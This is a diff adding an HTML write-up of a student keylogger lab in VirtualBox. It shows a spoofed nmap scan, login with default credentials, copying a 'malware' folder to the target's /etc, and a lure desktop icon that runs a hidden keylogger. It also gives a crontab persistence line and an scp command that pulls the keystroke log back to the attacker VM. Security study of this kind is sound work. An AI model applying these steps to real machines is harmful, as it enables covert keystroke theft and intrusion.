@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Key Logging</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <br>
+    <br><br><br><br><br>
+    <section id="headers">
+        <h1 class="title">Key Logger Project</h1>
+    </section>
+    <br>
+    <section id="headers">
+        <h3 class="scenario">Relevant scenarios</h3>
+    </section>
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+            VPN access to the private network
+            <br>
+            Public-facing servers that are in the development stage
+            <br>
+            Servers with open ssh with weak or default credentials
+            <br>
+            <br>
+            </p>
+        </div>
+    </section>
+
+    <section id="headers">
+        <h3 class ="subheader">Simulation environment</h3>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/network diagram example.png" alt="network_diagram" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                We will be using these two virtual machines that are in the same network, 10.0.2.0/24 using 10.0.2.1 as the default gateway.
+            </p>
+            <br>
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/two_vm_display.PNG" alt="two_screens" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/network setting.PNG" alt="setting" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                <br>
+                Under VirtualBox network manager and zero_two_network, both VMs are in promiscuous mode, meaning that they are able to understand each other’s existences within the network. 
+                <br>
+                Both virtual machines are updated and upgraded with Openssh-server and ufw installed, where they allow port 22 and ssh protocol to be enabled. 
+
+            </p>
+            <br>
+        </div>
+    </section>
+
+
+    <section id="headers">
+        <h3 class ="subheader">Python Malware Package</h3>
+
+    </section>
+    <br>
+
+    <section id="link">
+        <div class="link_container">
+            <h2 class="link_to_DES"><a href="https://github.com/IceBear1026/keylogger_fake_icon">Github Link to the Codes</a></h2>
+        </div>
+    </section>
+    <br>
+   
+    <section id="image">
+        <div class="image-container">
+            <div class="section__image__container">
+                <img src="./screenshot/python_s.PNG" alt = "the_code" class="rounded-image">
+                <p class="image-title">Keylogger.py</p>
+            </div>
+
+            <div class="section__image__container">
+                <img src="./screenshot/python_tk.PNG" alt = "tkinter" class="rounded-image">
+                <p class="image-title">Tkinter.py</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                Desktop File
+            </p>
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/desk.PNG" alt = "desktop_image"class="rounded-image">
+        </div>
+    </section>
+    <br>
+    <section id="headers">
+        <h3 class ="subheader">Deploying the scripts</h3>
+    </section>
+    <br>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/spoofed.PNG" alt = "spoofing" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                Run nnmap on the target IP address 10.0.2.100:
+                <br>
+                    - nmap -sV -e enp0s3 -S 10.0.2.99 10.0.2.100
+                <br> 
+                        - Using -S, I am spoofing my IP address to be 10.0.2.99<br>
+                        - Using -sV I check for the versions of the software<br>
+                        - Using enp0s3 (virtualbox - default virtual NIC), I can spoof the IP address that has assigned to it.<br><br>
+
+                While running nmap on the attacker VM, run this command on the target VM:<br>
+                    - tcpdump -p -i enp0s3 -n<br>
+                        - It will collect all the TCP packets and see the spoofed IP address running nmap.<br>
+                        - (This is just a simulation, so I wanted to show that the spoofed IP address is working.)<br><br>
+
+                After nmap scan of the internal network, the hacker will be able to collect information as such as the fact that the VM is a virtual machine, its MAC address, versions of OS and software installed, and ports that are open.
+            </p>
+            <br>
+        
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/escalation.PNG" alt = "result" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                Now, typically hackers will try default credentials or try brute-force attempts. Since I know this machine is a VM from Virtualbox Hypervisor, I can try to use default credentials: username - "vboxuser" and password - "changeme".
+                <br><br>
+                Then I can escalate my privilege with the same password using superuser command and "changeme". 
+            </p>
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                I intended to develop an independent Python script designed to attract the user's attention and prompt them to click on it, initiating its execution on their screen. That's why I placed both tkinter.py and an image.desktop file on the Desktop. By creating a desktop icon with an enticing appearance, the user is more likely to click on it. Before the user interacts with the icon, a tkinter.py script will be executed, which will, in turn, activate the keylogger.py to run discreetly in the background.
+            </p>
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/scp.PNG" alt = "transfer" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                Run scp -r ./Desktop/malware root@10.0.2.100:/etc/
+            </p>
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/file shown.PNG" alt = "folder" class="rounded-image">
+        </div>
+    </section>
+
+    <br>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/second file.PNG" alt ="show" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                The malware directory has been successfully deployed into its /etc directory.<br>
+                Go to each of the files using nano and make sure the directories are referencing the correct path.
+            </p>
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/cp Desktop.PNG" alt="transfer_again" class="rounded-image">
+        </div>
+    </section>
+    <br>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/give execute.PNG" alt="permissions" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                Cp the file into the Desktop folder<br>
+                The reason why the folder looks like that with a big red x is because we still haven't configured its permissions yet.<br> (Also there was some troubleshooting done on the png file path.)
+            </p>
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/desktop.PNG" alt="final_result" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="image">
+        <div class="section__image__container">
+            <img src="./screenshot/final.PNG" alt="proof" class="rounded-image">
+        </div>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                The final look should look like this. And when you click on it, it will launch the tk GUI and show the image while running the keylogger.py in the background.<br>
+            </p>
+        </div>
+    </section>
+
+    <section id="headers">
+        <h3 class ="subheader">Retrieving the keyLog.txt</h3>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                Just run: scp /etc/keyLog.txt vboxuser@10.0.2.69:/home/vboxuser/Desktop/
+            </p>
+        </div>
+    </section>
+
+    <section id="headers">
+        <h3 class ="subheader">Challenges that I faced creating this virtual environment and project</h3>
+    </section>
+
+    <section id="paragraph">
+        <div class="explanation">
+            <p>
+                The challenge:<br>
+                    The reason why I did not directly run the keylogger script from the ssh screen is the limitation in using pynput module. <br><br>
+                    Reference: https://pynput.readthedocs.io/en/latest/limitations.html<br><br>
+                    So if I ran:<br>
+                        ssh root@10.0.2.100 -X “python3 /etc/keylogger.py”<br><br>
+                    It would only capture the virtual machine (the Attacker VM) that is running the script because of pynput’s $DISPLAY and X-server limitations. When running it this way, you also have to configure the /etc/ssh/sshd_config file to be able to run a script through ssh.<br><br>
+                    Following configuration:<br><br>
+                        PasswordAuthentication yes<br>
+                        KdbInteractiveAuthentication no<br>
+                        PermitRootLogin yes<br>
+                        Pubkey Authentication no<br>
+                        X11Forwarding yes<br>
+                        X11DisplayOffset 10<br>
+                        X11UseLocalhost yes<br><br>
+                    Then service ssh restart<br><br>
+                    The problem with this approach is that -X server only scans the local screen that it’s capturing. So if I were to run the python script, it would only capture the ssh remote session on the attacker VM screen.
+                    <br><br>
+                Another challenge:<br>
+                    I tried to make the script run on the background every time the virtual machine rebooted. So then I used the cron service.<br>
+                        Command:<br>
+                            Crontab -e<br>
+                        Then in the file, I write:<br>
+                            @reboot /usr/bin/python3 /etc/keylogger.py<br><br>
+                    
+                    
+            </p>
+            <br><br><br><br><br><br><br>
+        </div>
+    </section>
+
+    <script src="script.js"></script>
+</body>
+</html>
